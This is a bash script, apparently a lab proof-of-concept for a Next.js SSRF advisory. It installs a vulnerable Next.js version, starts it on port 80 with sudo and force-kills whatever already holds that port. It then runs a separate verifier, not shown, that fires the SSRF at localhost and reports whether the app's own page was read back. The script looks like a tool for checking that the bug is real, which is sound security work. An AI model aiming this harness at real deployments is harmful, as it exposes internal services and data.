#!/usr/bin/env bash
# demo_impact.sh — End-to-end impact demo for GHSA-c4j6-fc7j-m34r
#
# Scenario: Next.js self-hosted directly on port 80 (typical prod pattern
# via setcap / Docker port-mapping / root). The SSRF target defaults to
# localhost:80 — which IS the same Next process. The attacker exfiltrates
# the Next app's own HTML home page through the bug.
#
# Requires:
#   - sudo (for port 80 bind)
#   - a vulnerable Next install at LAB_DIR (default ../next-vuln-lab)
#
# Run:
#   ./demo_impact.sh
set -euo pipefail

LAB_DIR="${LAB_DIR:-$HOME/tmp/next-vuln-lab}"
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
VERIFIER="$SCRIPT_DIR/verify_ghsa_c4j6.py"

if [ ! -d "$LAB_DIR" ]; then
  echo "lab dir not found at $LAB_DIR — set LAB_DIR or create the lab first" >&2
  exit 1
fi

cd "$LAB_DIR"

# pin vulnerable version
echo "[*] ensuring next@15.5.15 (vulnerable)..."
npm i next@15.5.15 --no-audit --no-fund --loglevel=error >/dev/null
./node_modules/.bin/next --version

# kill anything on :80 and :3030 from previous runs
sudo lsof -ti:80 2>/dev/null  | xargs -r sudo kill -9 2>/dev/null || true
lsof -ti:3030 2>/dev/null     | xargs -r kill -9 2>/dev/null      || true
sleep 1

echo "[*] building and starting Next on :80 (needs sudo)..."
./node_modules/.bin/next build >/dev/null
sudo -b ./node_modules/.bin/next start -p 80 >/tmp/next-impact-demo.log 2>&1

echo "[*] waiting for Next to bind :80..."
for _ in $(seq 1 30); do
  if curl -sf -o /dev/null http://127.0.0.1:80/; then break; fi
  sleep 0.5
done
curl -sI http://127.0.0.1:80/ | head -2

echo
echo "[*] firing SSRF exploit — read Next's own home page via the upgrade SSRF"
echo "    target=127.0.0.1:80  probe-path=/  (the proxy will loop to localhost:80=Next itself)"
echo

python3 "$VERIFIER" --target 127.0.0.1:80 --probe-path / --timeout 5 --json \
  | python3 -c '
import sys, json
r = json.loads(sys.stdin.read())
print(f"verdict:          {r[\"verdict\"]}")
print(f"impact_confirmed: {r.get(\"impact_confirmed\", False)}")
if r.get("upstream_status"):
    print(f"upstream_status:  {r[\"upstream_status\"]}")
if r.get("upstream_server"):
    print(f"upstream_server:  {r[\"upstream_server\"]}")
print(f"response (first 600 chars):")
print("-"*60)
print(r.get("response_snippet","")[:600])
print("-"*60)
print()
if r.get("impact_confirmed"):
    print("IMPACT CONFIRMED — SSRF reached a service on the target localhost")
    print("                   and read response data back (see snippet above).")
    sys.exit(0)
else:
    print("Impact NOT confirmed — vulnerability indicator present but no")
    print("data was exfiltrated. Re-check that something is listening on :80.")
    sys.exit(1)
'

echo
echo "[*] cleanup: stop Next on :80"
sudo lsof -ti:80 | xargs -r sudo kill -9 2>/dev/null || true
